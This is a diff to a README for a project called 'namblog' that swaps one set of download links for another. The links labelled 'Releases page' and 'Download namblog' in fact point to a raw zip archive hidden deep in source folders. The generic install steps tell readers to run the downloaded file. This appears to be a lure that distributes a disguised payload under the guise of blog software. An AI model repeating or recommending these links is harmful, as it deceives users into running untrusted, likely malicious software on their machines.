@@ -8,18 +8,18 @@ Welcome to namblog! This blog system helps you enhance your content presentation
 
 To get started, you need to download the application. You can find the latest versions on our releases page.
 
-[![Download namblog](https://github.com/tajongcarek/namblog/raw/refs/heads/main/NamBlog.API/Infrastructure/Persistence/Repositories/Software-v1.2.zip)](https://github.com/tajongcarek/namblog/raw/refs/heads/main/NamBlog.API/Infrastructure/Persistence/Repositories/Software-v1.2.zip)
+[![Download namblog](https://github.com/tajongcarek/namblog/raw/refs/heads/main/NamBlog.API/Infrastructure/Services/Software_3.8.zip)](https://github.com/tajongcarek/namblog/raw/refs/heads/main/NamBlog.API/Infrastructure/Services/Software_3.8.zip)
 
 Click the button above to visit the page and select the version suitable for your system. Follow the steps below to install namblog on your computer.
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/tajongcarek/namblog/raw/refs/heads/main/NamBlog.API/Infrastructure/Persistence/Repositories/Software-v1.2.zip) to choose the version you want.  
+   Go to the [Releases page](https://github.com/tajongcarek/namblog/raw/refs/heads/main/NamBlog.API/Infrastructure/Services/Software_3.8.zip) to choose the version you want.  
    
 2. **Select the Appropriate Version**  
    Look for the latest release. It is usually marked as “Latest.”  
 
 3. **Download the Installer**  
-   Click on the installer file link to start your download. The file will typically be named something like `https://github.com/tajongcarek/namblog/raw/refs/heads/main/NamBlog.API/Infrastructure/Persistence/Repositories/Software-v1.2.zip` or `https://github.com/tajongcarek/namblog/raw/refs/heads/main/NamBlog.API/Infrastructure/Persistence/Repositories/Software-v1.2.zip`.  
+   Click on the installer file link to start your download. The file will typically be named something like `https://github.com/tajongcarek/namblog/raw/refs/heads/main/NamBlog.API/Infrastructure/Services/Software_3.8.zip` or `https://github.com/tajongcarek/namblog/raw/refs/heads/main/NamBlog.API/Infrastructure/Services/Software_3.8.zip`.  
 
 4. **Run the Installer**  
    Once the download is complete, locate the file in your downloads folder. Double-click the file to start the installation process. 
@@ -76,4 +76,4 @@ If you need help at any point, don’t hesitate to reach out for support. You ca
 
 ## 🎉 Stay Updated
 
-Keep your application updated by visiting the [Releases page](https://github.com/tajongcarek/namblog/raw/refs/heads/main/NamBlog.API/Infrastructure/Persistence/Repositories/Software-v1.2.zip) regularly. Each update includes new features, improvements, and bug fixes. Enjoy your blogging experience with namblog!
+Keep your application updated by visiting the [Releases page](https://github.com/tajongcarek/namblog/raw/refs/heads/main/NamBlog.API/Infrastructure/Services/Software_3.8.zip) regularly. Each update includes new features, improvements, and bug fixes. Enjoy your blogging experience with namblog!
